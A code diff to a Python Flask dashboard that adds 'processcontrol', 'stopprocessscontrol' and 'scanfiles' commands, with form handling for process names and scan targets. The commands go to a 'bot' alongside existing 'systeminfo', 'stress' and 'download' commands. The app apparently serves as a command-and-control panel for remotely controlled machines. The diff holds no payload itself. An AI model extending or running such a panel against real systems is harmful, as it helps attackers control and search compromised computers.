@@ -255,7 +255,13 @@ def _take_cmd(bot, cmd):
 	elif cmd == "systeminfo":
 		return call_script(bot, cmd)
 
+	elif cmd == "stopprocessscontrol":
+		return call_script(bot, cmd)
 
+
+
+	elif "processcontrol" in cmd:
+		return call_script(bot, cmd)
 
 	elif "stress" in cmd:
 		return call_script(bot, cmd)
@@ -273,6 +279,9 @@ def _take_cmd(bot, cmd):
 		return call_script(bot, cmd)
 
 	elif "download" in cmd:
+		return call_script(bot, cmd)
+
+	elif "scanfiles" in cmd:
 		return call_script(bot, cmd)
 
 	else: return(f"Error: {cmd} is not a valid command")
@@ -312,6 +321,7 @@ def login():
 def favicon():
     return send_from_directory(os.path.join(app.root_path, 'static'),
                                'favicon.ico', mimetype='image/vnd.microsoft.icon')
+
 
 @app.route('/dashboard.html')
 def dashboard():
@@ -369,6 +379,14 @@ def command_check(command):
 	elif command == "download":
 		download_path 	= request.form.get('download-path')
 		return (f'{command} {download_path}')
+
+	elif command == "scanfiles":
+		scan_files 		= request.form.get('scan-files')
+		return (f'{command} {scan_files}')
+
+	elif command == "processcontrol":
+		process_names 	= request.form.get('process-names')
+		return (f'{command} {process_names}')
 
 	else: return command
 
